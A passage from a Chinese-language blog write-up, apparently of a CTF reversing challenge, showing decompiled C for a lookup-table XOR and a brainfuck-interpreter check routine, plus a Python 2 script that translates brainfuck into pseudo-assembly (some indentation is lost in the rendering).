<span class="k">while</span> <span class="p">(</span> <span class="n">v16</span> <span class="o">&lt;</span> <span class="n">v10</span> <span class="o">&amp;&amp;</span> <span class="o">!*</span><span class="p">(</span><span class="n">_BYTE</span> <span class="o">*</span><span class="p">)(</span><span class="n">v16</span> <span class="o">+</span> <span class="n">v11</span><span class="p">)</span> <span class="p">)</span>    
<span class="p">{</span>    
<span class="n">v6</span> <span class="o">=</span> <span class="n">v16</span><span class="o">++</span><span class="p">;</span>    
<span class="o">*</span><span class="p">(</span><span class="n">_BYTE</span> <span class="o">*</span><span class="p">)(</span><span class="n">v6</span> <span class="o">+</span> <span class="n">v9</span><span class="p">)</span> <span class="o">=</span> <span class="mi">49</span><span class="p">;</span>    
<span class="p">}</span>    
<span class="k">for</span> <span class="p">(</span> <span class="n">k</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">k</span> <span class="o">&lt;=</span> <span class="mi">57</span><span class="p">;</span> <span class="o">++</span><span class="n">k</span> <span class="p">)</span>    
<span class="n">byte_602500</span><span class="p">[</span><span class="n">k</span><span class="p">]</span> <span class="o">^=</span> <span class="n">byte_602490</span><span class="p">[</span><span class="n">k</span> <span class="o">%</span> <span class="mi">7</span><span class="p">]</span> <span class="o">^</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kr">__int8</span><span class="p">)</span><span class="n">k</span><span class="p">;</span>    
<span class="k">for</span> <span class="p">(</span> <span class="n">l</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">l</span> <span class="o">&lt;</span> <span class="n">v12</span><span class="p">;</span> <span class="o">++</span><span class="n">l</span> <span class="p">)</span> <span class="c1">//查表操作    
</span><span class="c1"></span><span class="o">*</span><span class="p">(</span><span class="n">_BYTE</span> <span class="o">*</span><span class="p">)(</span><span class="n">v16</span> <span class="o">+</span> <span class="n">l</span> <span class="o">+</span> <span class="n">v9</span><span class="p">)</span> <span class="o">=</span> <span class="n">byte_602500</span><span class="p">[</span><span class="o">*</span><span class="p">((</span><span class="kt">unsigned</span> <span class="kr">__int8</span> <span class="o">*</span><span class="p">)</span><span class="n">v20</span> <span class="o">+</span> <span class="n">v12</span> <span class="o">-</span> <span class="mi">1</span> <span class="o">-</span> <span class="n">l</span><span class="p">)];</span>    
</code></pre></td></tr></table>
</div>
</div><h3 id="验证部分">验证部分</h3>
<p>验证部分是一个brainfuck语言的解释器，这种语言基于一个简单的机器模型，除了指令，这个机器还包括：一个以字节为单位、被初始化为零的数组、一个指向该数组的指针（初始时指向数组的第一个字节）、以及用于输入输出的两个字节流。关于这个语言的介绍:   <br>
<a href="https://zh.wikipedia.org/wiki/Brainfuck" target="_blank" rel="noopener noreffer">Brainfuck</a>   <br>
<a href="https://www.nayuki.io/page/brainfuck-interpreter-javascript" target="_blank" rel="noopener noreffer">Brainfuck在线解析器</a>   <br>
这个语言一共只包含如下8个状态   <br>



    <div class="post-img-view">
        <a data-fancybox="gallery" href="/images/ec0b4f683ce7597660d4da19e3cd65cc/11884068-8a8a6b1f410bc20b.png">
            <img src="/images/ec0b4f683ce7597660d4da19e3cd65cc/11884068-8a8a6b1f410bc20b.png" alt=""  />
        </a>
    </div>
</p>
<p>典型特征是代码中包含指针的加减以及指针指向值的加减</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-cpp" data-lang="cpp"><span class="k">while</span> <span class="p">(</span> <span class="n">v5</span> <span class="o">&lt;</span> <span class="n">i</span> <span class="p">)</span>    
<span class="p">{</span>    
<span class="n">v2</span> <span class="o">=</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kr">__int8</span><span class="p">)</span><span class="n">byte_6020A0</span><span class="p">[</span><span class="n">v5</span><span class="p">];</span>    
<span class="k">if</span> <span class="p">(</span> <span class="n">v2</span> <span class="o">==</span> <span class="mh">0xC4</span> <span class="p">)</span>    
<span class="p">{</span>    
  <span class="o">++*</span><span class="n">v9</span><span class="p">;</span> <span class="c1">//+    
</span><span class="c1"></span><span class="p">}</span>    
<span class="k">else</span> <span class="nf">if</span> <span class="p">(</span> <span class="n">v2</span> <span class="o">&gt;</span> <span class="mi">196</span> <span class="p">)</span>    
<span class="p">{</span>    
  <span class="k">switch</span> <span class="p">(</span> <span class="n">v2</span> <span class="p">)</span>    
  <span class="p">{</span>    
    <span class="k">case</span> <span class="mh">0xDD</span><span class="o">:</span> <span class="c1">//[    
</span><span class="c1"></span>      <span class="k">if</span> <span class="p">(</span> <span class="o">!*</span><span class="n">v9</span> <span class="p">)</span>    
        <span class="n">v5</span> <span class="o">=</span> <span class="n">dword_603B20</span><span class="p">[</span><span class="n">v5</span><span class="p">];</span>    
      <span class="k">break</span><span class="p">;</span>    
    <span class="k">case</span> <span class="mh">0xFD</span><span class="o">:</span> <span class="c1">//]    
</span><span class="c1"></span>      <span class="n">v5</span> <span class="o">=</span> <span class="n">dword_603B20</span><span class="p">[</span><span class="n">v5</span><span class="p">]</span> <span class="o">-</span> <span class="mi">1</span><span class="p">;</span>    
      <span class="k">break</span><span class="p">;</span>    
    <span class="k">case</span> <span class="mh">0xC5</span><span class="o">:</span>    
      <span class="o">--*</span><span class="n">v9</span><span class="p">;</span>  <span class="c1">//-    
</span><span class="c1"></span>      <span class="k">break</span><span class="p">;</span>    
  <span class="p">}</span>    
<span class="p">}</span>    
<span class="k">else</span>    
<span class="p">{</span>    
  <span class="k">switch</span> <span class="p">(</span> <span class="n">v2</span> <span class="p">)</span>    
  <span class="p">{</span>    
    <span class="k">case</span> <span class="mh">0xA8</span><span class="o">:</span>    
      <span class="o">++</span><span class="n">v9</span><span class="p">;</span> <span class="c1">//&gt;    
</span><span class="c1"></span>      <span class="k">break</span><span class="p">;</span>    
    <span class="k">case</span> <span class="mh">0xA9</span><span class="o">:</span>    
      <span class="o">--</span><span class="n">v9</span><span class="p">;</span> <span class="c1">//&lt;    
</span><span class="c1"></span>      <span class="k">break</span><span class="p">;</span>    
    <span class="k">case</span> <span class="mi">1</span><span class="o">:</span> <span class="c1">//.    
</span><span class="c1"></span>      <span class="n">v3</span> <span class="o">=</span> <span class="n">v7</span><span class="o">++</span><span class="p">;</span>    
      <span class="n">s1</span><span class="p">[</span><span class="n">v3</span><span class="p">]</span> <span class="o">=</span> <span class="o">*</span><span class="n">v9</span><span class="p">;</span>    
      <span class="k">break</span><span class="p">;</span>    
  <span class="p">}</span>    
<span class="p">}</span>    
<span class="o">++</span><span class="n">v5</span><span class="p">;</span>    
<span class="p">}</span>    
</code></pre></td></tr></table>
</div>
</div><p>提取byte_6020A0中的指令，使用下面的解释器可以对brainfuck反编译</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">  1
</span><span class="lnt">  2
</span><span class="lnt">  3
</span><span class="lnt">  4
</span><span class="lnt">  5
</span><span class="lnt">  6
</span><span class="lnt">  7
</span><span class="lnt">  8
</span><span class="lnt">  9
</span><span class="lnt"> 10
</span><span class="lnt"> 11
</span><span class="lnt"> 12
</span><span class="lnt"> 13
</span><span class="lnt"> 14
</span><span class="lnt"> 15
</span><span class="lnt"> 16
</span><span class="lnt"> 17
</span><span class="lnt"> 18
</span><span class="lnt"> 19
</span><span class="lnt"> 20
</span><span class="lnt"> 21
</span><span class="lnt"> 22
</span><span class="lnt"> 23
</span><span class="lnt"> 24
</span><span class="lnt"> 25
</span><span class="lnt"> 26
</span><span class="lnt"> 27
</span><span class="lnt"> 28
</span><span class="lnt"> 29
</span><span class="lnt"> 30
</span><span class="lnt"> 31
</span><span class="lnt"> 32
</span><span class="lnt"> 33
</span><span class="lnt"> 34
</span><span class="lnt"> 35
</span><span class="lnt"> 36
</span><span class="lnt"> 37
</span><span class="lnt"> 38
</span><span class="lnt"> 39
</span><span class="lnt"> 40
</span><span class="lnt"> 41
</span><span class="lnt"> 42
</span><span class="lnt"> 43
</span><span class="lnt"> 44
</span><span class="lnt"> 45
</span><span class="lnt"> 46
</span><span class="lnt"> 47
</span><span class="lnt"> 48
</span><span class="lnt"> 49
</span><span class="lnt"> 50
</span><span class="lnt"> 51
</span><span class="lnt"> 52
</span><span class="lnt"> 53
</span><span class="lnt"> 54
</span><span class="lnt"> 55
</span><span class="lnt"> 56
</span><span class="lnt"> 57
</span><span class="lnt"> 58
</span><span class="lnt"> 59
</span><span class="lnt"> 60
</span><span class="lnt"> 61
</span><span class="lnt"> 62
</span><span class="lnt"> 63
</span><span class="lnt"> 64
</span><span class="lnt"> 65
</span><span class="lnt"> 66
</span><span class="lnt"> 67
</span><span class="lnt"> 68
</span><span class="lnt"> 69
</span><span class="lnt"> 70
</span><span class="lnt"> 71
</span><span class="lnt"> 72
</span><span class="lnt"> 73
</span><span class="lnt"> 74
</span><span class="lnt"> 75
</span><span class="lnt"> 76
</span><span class="lnt"> 77
</span><span class="lnt"> 78
</span><span class="lnt"> 79
</span><span class="lnt"> 80
</span><span class="lnt"> 81
</span><span class="lnt"> 82
</span><span class="lnt"> 83
</span><span class="lnt"> 84
</span><span class="lnt"> 85
</span><span class="lnt"> 86
</span><span class="lnt"> 87
</span><span class="lnt"> 88
</span><span class="lnt"> 89
</span><span class="lnt"> 90
</span><span class="lnt"> 91
</span><span class="lnt"> 92
</span><span class="lnt"> 93
</span><span class="lnt"> 94
</span><span class="lnt"> 95
</span><span class="lnt"> 96
</span><span class="lnt"> 97
</span><span class="lnt"> 98
</span><span class="lnt"> 99
</span><span class="lnt">100
</span><span class="lnt">101
</span><span class="lnt">102
</span><span class="lnt">103
</span><span class="lnt">104
</span><span class="lnt">105
</span><span class="lnt">106
</span><span class="lnt">107
</span><span class="lnt">108
</span><span class="lnt">109
</span><span class="lnt">110
</span><span class="lnt">111
</span><span class="lnt">112
</span><span class="lnt">113
</span><span class="lnt">114
</span><span class="lnt">115
</span><span class="lnt">116
</span><span class="lnt">117
</span><span class="lnt">118
</span><span class="lnt">119
</span><span class="lnt">120
</span><span class="lnt">121
</span><span class="lnt">122
</span><span class="lnt">123
</span><span class="lnt">124
</span><span class="lnt">125
</span><span class="lnt">126
</span><span class="lnt">127
</span><span class="lnt">128
</span><span class="lnt">129
</span><span class="lnt">130
</span><span class="lnt">131
</span><span class="lnt">132
</span><span class="lnt">133
</span><span class="lnt">134
</span><span class="lnt">135
</span><span class="lnt">136
</span><span class="lnt">137
</span><span class="lnt">138
</span><span class="lnt">139
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-python" data-lang="python"><span class="kn">import</span> <span class="nn">re</span>    
    
<span class="k">def</span> <span class="nf">sym2cal</span><span class="p">(</span><span class="n">s</span><span class="p">):</span>    
<span class="k">if</span> <span class="s1">&#39;&gt;&#39;</span> <span class="ow">in</span> <span class="n">s</span><span class="p">:</span>    
    <span class="k">return</span> <span class="nb">len</span><span class="p">(</span><span class="n">s</span><span class="p">)</span>    
<span class="k">else</span><span class="p">:</span>    
    <span class="k">return</span> <span class="o">-</span><span class="nb">len</span><span class="p">(</span><span class="n">s</span><span class="p">)</span>    
    
<span class="k">def</span> <span class="nf">cal</span><span class="p">(</span><span class="n">s</span><span class="p">):</span>    
<span class="k">if</span> <span class="s1">&#39;+&#39;</span> <span class="ow">in</span> <span class="n">s</span><span class="p">:</span>    
    <span class="k">return</span> <span class="s1">&#39;+= </span><span class="si">%d</span><span class="s1">&#39;</span><span class="o">%</span><span class="nb">len</span><span class="p">(</span><span class="n">s</span><span class="p">)</span>    
<span class="k">else</span><span class="p">:</span>    
    <span class="k">return</span> <span class="s1">&#39;-= </span><span class="si">%d</span><span class="s1">&#39;</span><span class="o">%</span><span class="nb">len</span><span class="p">(</span><span class="n">s</span><span class="p">)</span>    
    
<span class="k">def</span> <span class="nf">bf2asm</span><span class="p">(</span><span class="n">s</span><span class="p">,</span><span class="n">ptr</span><span class="p">,</span><span class="n">tab</span><span class="p">):</span>    
<span class="n">p</span> <span class="o">=</span> <span class="mi">0</span>    
<span class="n">l</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">s</span><span class="p">)</span>    
<span class="k">while</span><span class="p">(</span><span class="n">p</span><span class="o">&lt;</span><span class="n">l</span><span class="p">):</span>    
    <span class="n">pattern</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">compile</span><span class="p">(</span><span class="sa">r</span><span class="s1">&#39;([&gt;&lt;]*)\[-([&gt;&lt;]*)\[-\]([&gt;&lt;]+)\[-\]([&gt;&lt;]+)\[-([&gt;&lt;]+)\+([&gt;&lt;]+)\+([&gt;&lt;]+)\]([&gt;&lt;]+)\[-([&gt;&lt;]+)\+([&gt;&lt;]+)\]([&gt;&lt;]*)\[-([&gt;&lt;]+)\+([&gt;&lt;]+)\]([&gt;&lt;]*)\]&#39;</span><span class="p">)</span>    
    <span class="n">match</span> <span class="o">=</span> <span class="n">pattern</span><span class="o">.</span><span class="n">match</span><span class="p">(</span><span class="n">s</span><span class="p">[</span><span class="n">p</span><span class="p">:])</span>    
    <span class="k">if</span> <span class="n">match</span><span class="p">:</span>            
        <span class="n">p</span> <span class="o">+=</span> <span class="nb">len</span><span class="p">(</span><span class="n">match</span><span class="o">.</span><span class="n">group</span><span class="p">())</span>    
    
        <span class="n">groups</span> <span class="o">=</span> <span class="n">match</span><span class="o">.</span><span class="n">groups</span><span class="p">()</span>    
        <span class="n">ptr1</span> <span class="o">=</span> <span class="n">ptr</span> <span class="o">+</span> <span class="n">sym2cal</span><span class="p">(</span><span class="n">groups</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span>    
        <span class="n">ptr2</span> <span class="o">=</span> <span class="n">ptr1</span>    
        <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">xrange</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">4</span><span class="p">):</span>    
            <span class="n">ptr2</span> <span class="o">+=</span> <span class="n">sym2cal</span><span class="p">(</span><span class="n">groups</span><span class="p">[</span><span class="n">i</span><span class="p">])</span>    
        <span class="n">ptr3</span> <span class="o">=</span> <span class="n">ptr2</span>    
        <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">xrange</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span><span class="mi">12</span><span class="p">):</span>    
            <span class="n">ptr3</span> <span class="o">+=</span> <span class="n">sym2cal</span><span class="p">(</span><span class="n">groups</span><span class="p">[</span><span class="n">i</span><span class="p">])</span>    
        <span class="k">print</span> <span class="n">tab</span><span class="o">+</span><span class="s1">&#39;mem[</span><span class="si">%d</span><span class="s1">] += mem[</span><span class="si">%d</span><span class="s1">]*mem[</span><span class="si">%d</span><span class="s1">]&#39;</span><span class="o">%</span><span class="p">(</span><span class="n">ptr3</span><span class="p">,</span><span class="n">ptr2</span><span class="p">,</span><span class="n">ptr1</span><span class="p">)</span>    
    
        <span class="k">for</span> <span class="n">v</span> <span class="ow">in</span> <span class="n">groups</span><span class="p">:</span>    
            <span class="n">ptr</span> <span class="o">+=</span> <span class="n">sym2cal</span><span class="p">(</span><span class="n">v</span><span class="p">)</span>    
        <span class="k">continue</span>    
        
    <span class="n">pattern</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">compile</span><span class="p">(</span><span class="sa">r</span><span class="s1">&#39;([&gt;&lt;]*)\[-\]([&gt;&lt;]+)\[-\]([&gt;&lt;]+)\[-([&gt;&lt;]+)\+([&gt;&lt;]+)\+([&gt;&lt;]+)\]([&gt;&lt;]+)\[-([&gt;&lt;]+)\+([&gt;&lt;]+)\]([&gt;&lt;]*)\[-([&gt;&lt;]+)\+([&gt;&lt;]+)\]&#39;</span><span class="p">)</span>    
    <span class="n">match</span> <span class="o">=</span> <span class="n">pattern</span><span class="o">.</span><span class="n">match</span><span class="p">(</span><span class="n">s</span><span class="p">[</span><span class="n">p</span><span class="p">:])</span>    
    <span class="k">if</span> <span class="n">match</span><span class="p">:</span>    
        <span class="n">p</span> <span class="o">+=</span> <span class="nb">len</span><span class="p">(</span><span class="n">match</span><span class="o">.</span><span class="n">group</span><span class="p">())</span>    
    
        <span class="n">groups</span> <span class="o">=</span> <span class="n">match</span><span class="o">.</span><span class="n">groups</span><span class="p">()</span>    
        <span class="n">ptr1</span> <span class="o">=</span> <span class="n">ptr</span>    
        <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">xrange</span><span class="p">(</span><span class="mi">3</span><span class="p">):</span>    
            <span class="n">ptr1</span> <span class="o">+=</span> <span class="n">sym2cal</span><span class="p">(</span><span class="n">groups</span><span class="p">[</span><span class="n">i</span><span class="p">])</span>    
        <span class="n">ptr2</span> <span class="o">=</span> <span class="n">ptr1</span>    
        <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">xrange</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span><span class="mi">11</span><span class="p">):</span>    
            <span class="n">ptr2</span> <span class="o">+=</span> <span class="n">sym2cal</span><span class="p">(</span><span class="n">groups</span><span class="p">[</span><span class="n">i</span><span class="p">])</span>    
        <span class="k">print</span> <span class="n">tab</span><span class="o">+</span><span class="s1">&#39;mem[</span><span class="si">%d</span><span class="s1">] += mem[</span><span class="si">%d</span><span class="s1">]&#39;</span><span class="o">%</span><span class="p">(</span><span class="n">ptr2</span><span class="p">,</span><span class="n">ptr1</span><span class="p">)</span>    
    
        <span class="k">for</span> <span class="n">v</span> <span class="ow">in</span> <span class="n">groups</span><span class="p">:</span>    
            <span class="n">ptr</span> <span class="o">+=</span> <span class="n">sym2cal</span><span class="p">(</span><span class="n">v</span><span class="p">)</span>    
        <span class="k">continue</span>    
    
    <span class="n">pattern</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">compile</span><span class="p">(</span><span class="sa">r</span><span class="s1">&#39;([&gt;&lt;]*)\[-\]([&gt;&lt;]+)\[-\]([&gt;&lt;]+)\[-([&gt;&lt;]+)\+([&gt;&lt;]+)\+([&gt;&lt;]+)\]([&gt;&lt;]+)\[-([&gt;&lt;]+)\+([&gt;&lt;]+)\]([&gt;&lt;]+)&#39;</span><span class="p">)</span>    
    <span class="n">match</span> <span class="o">=</span> <span class="n">pattern</span><span class="o">.</span><span class="n">match</span><span class="p">(</span><span class="n">s</span><span class="p">[</span><span class="n">p</span><span class="p">:])</span>    
    <span class="k">if</span> <span class="n">match</span><span class="p">:</span>    
        <span class="n">p</span> <span class="o">+=</span> <span class="nb">len</span><span class="p">(</span><span class="n">match</span><span class="o">.</span><span class="n">group</span><span class="p">())</span>    
    
        <span class="n">groups</span> <span class="o">=</span> <span class="n">match</span><span class="o">.</span><span class="n">groups</span><span class="p">()</span>    
        <span class="n">ptr1</span> <span class="o">=</span> <span class="n">ptr</span> <span class="o">+</span> <span class="n">sym2cal</span><span class="p">(</span><span class="n">groups</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span>    
        <span class="n">ptr2</span> <span class="o">=</span> <span class="n">ptr1</span> <span class="o">+</span> <span class="n">sym2cal</span><span class="p">(</span><span class="n">groups</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span>    
        <span class="n">ptr3</span> <span class="o">=</span> <span class="n">ptr2</span> <span class="o">+</span> <span class="n">sym2cal</span><span class="p">(</span><span class="n">groups</span><span class="p">[</span><span class="mi">2</span><span class="p">])</span>    
        <span class="k">print</span> <span class="n">tab</span><span class="o">+</span><span class="s1">&#39;mem[</span><span class="si">%d</span><span class="s1">] = mem[</span><span class="si">%d</span><span class="s1">]&#39;</span><span class="o">%</span><span class="p">(</span><span class="n">ptr1</span><span class="p">,</span><span class="n">ptr3</span><span class="p">)</span>    
    
        <span class="k">for</span> <span class="n">v</span> <span class="ow">in</span> <span class="n">groups</span><span class="p">:</span>    
            <span class="n">ptr</span> <span class="o">+=</span> <span class="n">sym2cal</span><span class="p">(</span><span class="n">v</span><span class="p">)</span>    
        <span class="k">continue</span>    
            
    <span class="n">pattern</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">compile</span><span class="p">(</span><span class="sa">r</span><span class="s1">&#39;\[-\]&#39;</span><span class="p">)</span>    
    <span class="n">match</span> <span class="o">=</span> <span class="n">pattern</span><span class="o">.</span><span class="n">match</span><span class="p">(</span><span class="n">s</span><span class="p">[</span><span class="n">p</span><span class="p">:])</span>    
    <span class="k">if</span> <span class="n">match</span><span class="p">:</span>    
        <span class="n">p</span> <span class="o">+=</span> <span class="nb">len</span><span class="p">(</span><span class="n">match</span><span class="o">.</span><span class="n">group</span><span class="p">())</span>    
        <span class="k">print</span> <span class="n">tab</span><span class="o">+</span><span class="s1">&#39;mem[</span><span class="si">%d</span><span class="s1">] = 0&#39;</span><span class="o">%</span><span class="p">(</span><span class="n">ptr</span><span class="p">)</span>    
        <span class="k">continue</span>    
    
    <span class="n">pattern</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">compile</span><span class="p">(</span><span class="sa">r</span><span class="s1">&#39;&gt;+&#39;</span><span class="p">)</span>    
    <span class="n">match</span> <span class="o">=</span> <span class="n">pattern</span><span class="o">.</span><span class="n">match</span><span class="p">(</span><span class="n">s</span><span class="p">[</span><span class="n">p</span><span class="p">:])</span>    
    <span class="k">if</span> <span class="n">match</span><span class="p">:</span>    
        <span class="n">p</span> <span class="o">+=</span> <span class="nb">len</span><span class="p">(</span><span class="n">match</span><span class="o">.</span><span class="n">group</span><span class="p">())</span>    
        <span class="n">ptr</span> <span class="o">+=</span> <span class="nb">len</span><span class="p">(</span><span class="n">match</span><span class="o">.</span><span class="n">group</span><span class="p">())</span>    
        <span class="k">continue</span>    
    
    <span class="n">pattern</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">compile</span><span class="p">(</span><span class="sa">r</span><span class="s1">&#39;&lt;+&#39;</span><span class="p">)</span>    
    <span class="n">match</span> <span class="o">=</span> <span class="n">pattern</span><span class="o">.</span><span class="n">match</span><span class="p">(</span><span class="n">s</span><span class="p">[</span><span class="n">p</span><span class="p">:])</span>    
    <span class="k">if</span> <span class="n">match</span><span class="p">:</span>    
        <span class="n">p</span> <span class="o">+=</span> <span class="nb">len</span><span class="p">(</span><span class="n">match</span><span class="o">.</span><span class="n">group</span><span class="p">())</span>    
        <span class="n">ptr</span> <span class="o">-=</span> <span class="nb">len</span><span class="p">(</span><span class="n">match</span><span class="o">.</span><span class="n">group</span><span class="p">())</span>    
        <span class="k">continue</span>    
    
    <span class="n">pattern</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">compile</span><span class="p">(</span><span class="sa">r</span><span class="s1">&#39;\++&#39;</span><span class="p">)</span>    
    <span class="n">match</span> <span class="o">=</span> <span class="n">pattern</span><span class="o">.</span><span class="n">match</span><span class="p">(</span><span class="n">s</span><span class="p">[</span><span class="n">p</span><span class="p">:])</span>    
    <span class="k">if</span> <span class="n">match</span><span class="p">:</span>    
        <span class="n">p</span> <span class="o">+=</span> <span class="nb">len</span><span class="p">(</span><span class="n">match</span><span class="o">.</span><span class="n">group</span><span class="p">())</span>    
        <span class="k">print</span> <span class="n">tab</span><span class="o">+</span><span class="s1">&#39;mem[</span><span class="si">%d</span><span class="s1">] </span><span class="si">%s</span><span class="s1">&#39;</span><span class="o">%</span><span class="p">(</span><span class="n">ptr</span><span class="p">,</span><span class="n">cal</span><span class="p">(</span><span class="n">match</span><span class="o">.</span><span class="n">group</span><span class="p">()))</span>    
        <span class="k">continue</span>    
    
    <span class="n">pattern</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">compile</span><span class="p">(</span><span class="sa">r</span><span class="s1">&#39;-+&#39;</span><span class="p">)</span>    
    <span class="n">match</span> <span class="o">=</span> <span class="n">pattern</span><span class="o">.</span><span class="n">match</span><span class="p">(</span><span class="n">s</span><span class="p">[</span><span class="n">p</span><span class="p">:])</span>    
    <span class="k">if</span> <span class="n">match</span><span class="p">:</span>    
        <span class="n">p</span> <span class="o">+=</span> <span class="nb">len</span><span class="p">(</span><span class="n">match</span><span class="o">.</span><span class="n">group</span><span class="p">())</span>    
        <span class="k">print</span> <span class="n">tab</span><span class="o">+</span><span class="s1">&#39;mem[</span><span class="si">%d</span><span class="s1">] </span><span class="si">%s</span><span class="s1">&#39;</span><span class="o">%</span><span class="p">(</span><span class="n">ptr</span><span class="p">,</span><span class="n">cal</span><span class="p">(</span><span class="n">match</span><span class="o">.</span><span class="n">group</span><span class="p">()))</span>    
        <span class="k">continue</span>    
    
    <span class="n">c</span> <span class="o">=</span> <span class="n">s</span><span class="p">[</span><span class="n">p</span><span class="p">]</span>    
    <span class="k">if</span> <span class="n">c</span> <span class="o">==</span> <span class="s1">&#39;[&#39;</span><span class="p">:</span>    
        <span class="n">stk</span> <span class="o">=</span> <span class="mi">1</span>    
        <span class="k">for</span> <span class="n">i</span><span class="p">,</span><span class="n">v</span> <span class="ow">in</span> <span class="nb">enumerate</span><span class="p">(</span><span class="n">s</span><span class="p">[</span><span class="n">p</span><span class="o">+</span><span class="mi">1</span><span class="p">:]):</span>    
            <span class="k">if</span> <span class="n">v</span> <span class="o">==</span> <span class="s1">&#39;[&#39;</span><span class="p">:</span>    
                <span class="n">stk</span> <span class="o">+=</span> <span class="mi">1</span>    
            <span class="k">elif</span> <span class="n">v</span> <span class="o">==</span> <span class="s1">&#39;]&#39;</span><span class="p">:</span>    
                <span class="n">stk</span> <span class="o">-=</span> <span class="mi">1</span>    
            <span class="k">else</span><span class="p">:</span>    
                <span class="k">continue</span>    
            <span class="k">if</span> <span class="n">stk</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>    
                <span class="k">print</span> <span class="n">tab</span><span class="o">+</span><span class="s1">&#39;while mem[</span><span class="si">%d</span><span class="s1">]:&#39;</span><span class="o">%</span><span class="n">ptr</span>    
                <span class="n">ptr</span> <span class="o">=</span> <span class="n">bf2asm</span><span class="p">(</span><span class="n">s</span><span class="p">[</span><span class="n">p</span><span class="o">+</span><span class="mi">1</span><span class="p">:</span><span class="n">p</span><span class="o">+</span><span class="mi">1</span><span class="o">+</span><span class="n">i</span><span class="p">],</span><span class="n">ptr</span><span class="p">,</span><span class="n">tab</span><span class="o">+</span><span class="s1">&#39;</span><span class="se">\t</span><span class="s1">&#39;</span><span class="p">)</span>    
                <span class="n">p</span> <span class="o">+=</span> <span class="n">i</span><span class="o">+</span><span class="mi">1</span>    
                <span class="k">break</span>    
        <span class="k">continue</span>    
    
    <span class="k">elif</span> <span class="n">c</span> <span class="o">==</span> <span class="s1">&#39;,&#39;</span><span class="p">:</span>    
        <span class="k">if</span> <span class="n">input_ptr</span> <span class="o">&lt;</span> <span class="mi">96</span><span class="p">:</span>    
            <span class="k">print</span> <span class="n">tab</span><span class="o">+</span><span class="s1">&#39;mov mem[</span><span class="si">%d</span><span class="s1">] input[input_ptr]&#39;</span><span class="o">%</span><span class="n">ptr</span>    
        <span class="k">else</span><span class="p">:</span>    
            <span class="k">if</span> <span class="n">bit_add</span> <span class="o">&gt;=</span> <span class="mi">3600</span><span class="p">:</span>    
                <span class="k">print</span> <span class="n">tab</span><span class="o">+</span><span class="s1">&#39;mov mem[</span><span class="si">%d</span><span class="s1">] 0x30&#39;</span><span class="o">%</span><span class="n">ptr</span>    
            <span class="k">else</span><span class="p">:</span>    
                <span class="k">print</span> <span class="n">tab</span><span class="o">+</span><span class="s1">&#39;mov mem[</span><span class="si">%d</span><span class="s1">] 1&#39;</span><span class="o">%</span><span class="n">ptr</span>    
    <span class="k">elif</span> <span class="n">c</span> <span class="o">==</span> <span class="s1">&#39;.&#39;</span><span class="p">:</span>    
        <span class="k">print</span> <span class="n">tab</span><span class="o">+</span><span class="s1">&#39;cmp mem[</span><span class="si">%d</span><span class="s1">] data[data_ptr]&#39;</span><span class="o">%</span><span class="n">ptr</span>    
    <span class="n">p</span> <span class="o">+=</span> <span class="mi">1</span>    
<span class="k">return</span> <span class="n">ptr</span>    
    
